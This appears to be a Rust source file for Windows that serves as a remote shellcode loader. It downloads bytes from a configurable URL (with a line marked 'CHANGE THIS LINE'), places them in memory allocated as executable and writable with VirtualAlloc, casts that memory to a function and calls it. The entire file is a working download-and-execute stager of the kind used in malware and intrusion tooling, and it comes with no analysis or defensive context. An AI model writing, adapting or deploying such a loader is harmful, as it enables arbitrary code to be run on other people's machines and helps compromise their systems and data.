#![allow(unused)]

use std::error::Error;
use reqwest::blocking::Client;
use windows::Win32::System::Memory::{
    VirtualAlloc,
    MEM_COMMIT,
    MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
};

fn main() {
    unsafe {

        let url= String::from("http://127.0.0.1:8080/shellcode"); // CHANGE THIS LINE
        let shellcode = fetch_payload(&url).unwrap();
        let dwsize = shellcode.len();
        let pointer = allocate_memory(dwsize);

        execute_payload(&shellcode, pointer);
    }
}

fn fetch_payload(url: &String) -> Result<Vec<u8>, Box<dyn Error>> {
    let client = Client::new();
    let response = client.get(url).send()?;
    let shellcode = response.bytes()?.to_vec();

    Ok(shellcode)
}


unsafe fn allocate_memory(dwsize: usize) -> *mut u8{
    VirtualAlloc(
        None,
        dwsize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    ) as *mut u8
}

unsafe fn execute_payload(shellcode: &[u8], pointer: *mut u8) -> Result<(), Box<dyn Error>> {
    pointer.copy_from_nonoverlapping(shellcode.as_ptr(), shellcode.len());

    let func: extern "stdcall" fn() = std::mem::transmute(pointer);

    func();
    
    Ok(())
}
